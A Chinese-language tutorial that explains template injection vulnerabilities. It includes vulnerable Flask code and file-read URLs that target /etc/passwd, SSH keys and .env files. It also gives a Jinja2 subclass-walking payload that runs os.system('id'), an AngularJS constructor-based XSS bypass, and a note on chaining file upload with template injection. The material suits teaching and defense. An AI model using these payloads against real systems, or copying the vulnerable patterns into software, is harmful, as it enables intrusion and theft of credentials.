**0x01**

**简介**

模板引擎是允许开发者或设计师在创建动态网页的时候，从数据展示中分离编程逻辑的工具。  
模板有工作在后端的模板如smarty(php)，jinja(python)，而前端框架中也有模板语言这种东西比如说,angularJS中，就有在标签之中使用模板语言进行解析的做法。模板语言，一般以{{ #code }} 的形式夹杂在一般的HTML中，也有{% %} 这种类型的控制代码。

  

总体来说，是为了更好,更方便的展示数据，将View 和controller分离。

  

**0x02**

**可控制模板文件名导致任意文件读取**

@main.route('/index')

def index():     

    # 从 get参数中取得模板名    

    template\_name = request.args.get('name')    

    #渲染模板    

    return render\_template(template\_name)

对于模板文件的渲染来说,遇到 

{{ }}

{# #}

{% %}

等预定义标签，则调用程序来进行解析，否则则保留原样输出，因此,在一般的不会出现这些这几种标签的文件中，就会将整个文件完整的输出出来，造成一个任意文件读取的信息泄露漏洞。

http://path/index?name=/etc/passwd

http://path/index?name=/var/www/html

http://path/index?name=~/.ssh/authorized\_keys

http://path/index?name=~/.env

http://path/index?name=/etc/apache2/apache.conf

可以直接获取系统关键的敏感信息。

  

**0x03**

**拼接模板导致代码注入和代码执行**

有很多种情况都可以被利用，如下  
**1.可能的注入点:**

(1) 页面直接在模板中回显URL

(2) 页面直接在模板回显header中的一部分

(3) 输入中的一部分被直接插入模板中

(4) 等一切在模板被render函数渲染之前就可以插入

举几个漏洞代码的例子:

@main.route('/index')

def index():

    url = request.args.get("url")

    ip = request.headers.get("X-Forwarded-For")

    template = """

    <html>

    <body>

    <div class="main small-width">

    <div id="section-announce" class="section">

        <div class="title">

            <a class="section-title""> %s </a>

            <a class="more" href=""> %s ></a>

            <div class="clear"></div>

        </div>

        <hr/>

    </div>

    </div>

    </body>

    </html>

        """ % (url,ip)

    return  render\_template\_string(template)

这个地方拼接了X-Forwarded-For 的头选项，我们可以通过修改头来完成注释，将头修改为相应的模板内容。

  

那么，如果我们掌握了一个可以注入的地方，我们可以做哪些事情。由于大多数的模板中并不允许我们直接去执行后端语言的代码，而只能使用限定的模板语言。

  

**2.利用点，控制以上输入之后可以在后面追加模板表达式**

(1) 关闭safe属性(转义)进行XSS。

(2) 修改整个页面,进行钓鱼等其他利用内容视觉进行的攻击。

(3) 利用模板语言中的一些元属性进行进一步的控制。

(4) 使用配置项进行敏感信息获取 。  
举一个利用的例子：

{% for c in \[\].\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() %}

  

{% if c.\_\_name\_\_ == 'catch\_warnings' %}

  

{{c.\_\_init\_\_.func\_globals\['linecache'\].\_\_dict\_\_\['os'\].system('id') }}

  

{% endif %}

  

{% endfor %}

利用for属性取遍历加上固定的函数，来执行代码。

  

**0x04**

**前端模板代码注入导致XSS**

一个最为经典的例子就是angularJs中的表达式注入。

  

angular使用ng-bind的方式，来绑定js中的变量与dom数据，这个时候,预设的模板，经过scope(体)的渲染之后，展现出数据，以下代码示例

<script>

        angular.module('scopeExample', \[\]).controller('MyController', \['$scope', function($scope) {

            $scope.username = 'World';

            $scope.foo = function() {

                return 'Hello ' + $scope.username + '!';

            };

        }\]);

</script>

<body ng-app="scopeExample">

    <div ng-controller="MyController">

        <table border="1">

        <tr>

            <th>Expression</th> <th>Result</th>

        </tr>

        <tr>

            <td ng-non-bindable>{{ username }}</td> <td>{{ username }}</td>

        </tr>

        <tr>

            <td ng-non-bindable>{{ foo() }}</td> <td>{{ sayHello() }}</td>

        </tr>

        <tr>

            <td ng-non-bindable>{{ $eval("foo()") }}</td> <td>{{ $eval("sayHello()") }}</td>

        </tr>

        <tr>

            <td ng-non-bindable>{{ alert(1) }}</td> <td>{{ alert(1) }}</td>

        </tr>

        </table>

    </div>

</body>

可以看绑定了到，在双括号内的表达式被执行了

![](../Images/091972de5db9753aa14b29aca31edd87.png)

我们可以通过这种方式来执行JavaScript代码以达到XSS,Click Hijack等目的。

  

**但是**，angular也是有一定的防护的，在双括号中被执行的js代码，其无论函数还是值，都必须是在js中scope对象的属性，因此我们想要利用的函数都无法执行了。

  
举个例子，接着上面代码:

<div>{{username}}</div>

<div>{{alert(1)}}</div>

// 会被解释为

scope.username;

scope.alert(1);

scope有username这个属性，则输出这个属性。scope并没有alert这个成员函数，因此这样写会报错。

  

然而道高一尺魔高一丈，我们可以利用js动态类型的特性，从添加和修改属性以及元类型出发来进行bypass。在js中，一个对象除了本身的属性和函数之外，还有一些元属性，比如constructor，任何实例的对象和函数都有这一属性，因此我们只要用 **{{ constructor.constructor.alert(1) }} **就可以执行我们要的代码了。

**注:**为什么是两层constructior，因为第一层的constructor是一个对象构造器，而对象构造器的构造器属性是一个函数构造器，js默认的函数就是在函数构造器的域下面。

因此，如果后端有输出在被绑定了属性的标签中，就可以用。

  

**0x05**

**文件上传与上面漏洞的综合利用**

在一些新型的框架中，web路径不由磁盘上面的文件结构直接映射，则文件上传即使成功，也没有任何用处。

  
在编译型和JIT的语言中，服务端程序一经编译立即确定，即使上传了webshell代码,如果没有重启服务，也没有太大用处，因此文件上传漏洞的影响范围一般也就只能限制在php和ASP中，在cgi,和python，golang等语言开发的服务端中就会失效。

  

**但是 **, 如果文件上传与模板注入结合，上传一个模板文件至模板的文件夹中，来替换一个已有的模板文件，或者是找到一个可以输入模板名的点，就可以执行自己的代码，以达到代码执行等效果。
